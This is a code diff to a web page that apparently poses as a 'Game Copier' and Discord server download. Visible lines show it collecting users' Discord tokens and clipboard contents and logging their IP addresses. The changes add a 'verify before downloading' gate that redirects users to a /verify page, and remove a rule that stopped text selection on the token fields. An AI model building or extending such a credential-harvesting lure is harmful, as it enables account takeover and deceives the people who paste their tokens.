@@ -115,14 +115,6 @@
       display: none;
     }
 
-    /* Disable text selection on token inputs */
-    #tokenInput, #discordTokenInput {
-      user-select: none;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-    }
-
     .error-message {
       color: #ff6b6b;
       margin-top: 10px;
@@ -281,6 +273,8 @@
       discordTokenInput.value = '';
       gameDownloadSection.style.display = 'none';
       discordDownloadSection.style.display = 'none';
+      // Optionally, reset verification flag
+      // localStorage.removeItem('tokenGateVerified');
     }
 
     // Get user IP for logging
@@ -403,7 +397,7 @@
         });
 
         alert('Clipboard content saved.');
-        // SHOW download section for Game Copier
+        // Show download section for Game Copier
         gameDownloadSection.style.display = 'block';
 
       } catch {
@@ -413,8 +407,17 @@
     };
 
     gameDownloadBtn.onclick = () => {
-      // Download logic for Game Copier
-      window.location.href = "/download";
+      // Verification check
+      if(localStorage.getItem('tokenGateVerified') === '1') {
+        window.location.href = "/download";
+      } else {
+        gameDownloadMsg.textContent = "You must verify before downloading.";
+        gameVerifyBtn.style.display = 'inline-block';
+      }
+    };
+
+    gameVerifyBtn.onclick = () => {
+      window.location.href = '/verify';
     };
 
     // Discord Server Logic
@@ -464,7 +467,7 @@
 
         alert('Server token saved successfully!');
         resetAll();
-        // SHOW download section for Discord Server
+        // Show download section for Discord Server
         discordDownloadSection.style.display = 'block';
       } catch (err) {
         alert('Failed to save token.');
@@ -472,8 +475,28 @@
     };
 
     discordDownloadBtn.onclick = () => {
-      // Download logic for Discord Server
-      window.location.href = "/download";
+      // Verification check
+      if(localStorage.getItem('tokenGateVerified') === '1') {
+        window.location.href = "/download";
+      } else {
+        discordDownloadMsg.textContent = "You must verify before downloading.";
+        discordVerifyBtn.style.display = 'inline-block';
+      }
+    };
+
+    discordVerifyBtn.onclick = () => {
+      window.location.href = '/verify';
+    };
+
+    // Verification post-callback (if user returns after verifying)
+    window.onload = function() {
+      if(localStorage.getItem('tokenGateVerified') === '1') {
+        // If user has verified, show notice and hide verify button (if on download view)
+        gameDownloadMsg.textContent = "Verification successful! You can now download.";
+        gameVerifyBtn.style.display = 'none';
+        discordDownloadMsg.textContent = "Verification successful! You can now download.";
+        discordVerifyBtn.style.display = 'none';
+      }
     };
 
     // Admin login
